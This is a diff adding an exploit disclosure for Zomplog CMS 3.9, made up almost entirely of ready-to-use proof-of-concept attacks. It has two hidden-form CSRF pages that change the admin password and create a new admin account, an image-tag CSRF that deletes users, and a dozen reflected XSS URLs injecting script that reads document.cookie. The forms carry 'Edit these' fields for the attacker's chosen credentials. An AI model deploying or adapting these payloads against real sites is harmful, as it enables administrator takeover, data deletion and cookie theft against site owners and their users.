@@ -1,0 +1,78 @@
+<!---
+    Title: Zomplog CMS 3.9 Multiple XSS/CSRF Vulnerabilities
+    Author: 10n1z3d <10n1z3d[at]w[dot]cn>
+    Date: Sun 15 Aug 2010 04:33:33 PM EEST
+    Vendor: http://www.zomp.nl/zomplog/
+    Download: http://www.zomp.nl/zomplog/downloads/zomplog/zomplog3.9.zip
+--->
+
+-=[ CSRF PoC 1 - Change Admin Password ]=-
+
+    <html>
+        <head>
+            <title>Zomplog CMS 3.9 Multiple XSS/CSRF Vulnerabilities - Change Admin Password</title>
+        </head>
+        <body>
+            <form name="csrrf" action="http://[domain]/admin/profile.php" method="post" >
+                <!--- Edit these --->
+                <input type="hidden" name="password" value="rootroot" />
+                <input type="hidden" name="password2" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="name" value="root" />
+                <input type="hidden" name="email" value="root@root.com" />
+                <input type="hidden" name="address" value="" />
+                <input type="hidden" name="zip" value="" />
+                <input type="hidden" name="country" value="" />
+                <input type="hidden" name="birthday" value="" />
+                <input type="hidden" name="url" value="" />
+                <input type="hidden" name="image" value="" />
+                <input type="hidden" name="movie" value="" />
+                <input type="hidden" name="about" value="" />
+                <input type="hidden" name="interests" value="" />
+                <input type="submit" name="Submit" value="Continue" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 2 - Create Admin User ]=-
+
+    <html>
+        <head>
+            <title>Zomplog CMS 3.9 Multiple XSS/CSRF Vulnerabilities - Create Admin User</title>
+        </head>
+        <body>
+            <form name="csrf" action="http://[domain]/admin/users.php" method="post">
+                <!--- Edit these --->
+                <input type="hidden" name="login" value="root" />
+                <input type="hidden" name="password" value="rootroot" />
+                <input type="hidden" name="password2" value="rootroot" />
+                <!--- Do not edit below --->
+                <input type="hidden" name="admin" value="1" />
+                <input type="submit" name="submit" value="Continue" />
+            </form>
+        </body>
+    </html>
+    
+-=[ CSRF PoC 3 - Delete User ]=-
+    
+    <img src="http://[domain]/admin/schredder.php?tablename=zomplog_users&id=[user id here]" alt="Do you see this?" />
+    
+-=[ XSS PoCs ]=-
+
+    http://[domain]/admin/users.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/category.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/entry.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/newentry.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/comments.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/newpage.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/page.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/settings.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/changeclothes.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/settings_theme.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/themes.php?message=<script>alert(document.cookie);</script>
+    http://[domain]/admin/plugins.php?message=<script>alert(document.cookie);</script>
+    
+<!---
+    http://www.evilzone.org/
+    irc.evilzone.org  (6697 / 9999)
+--->
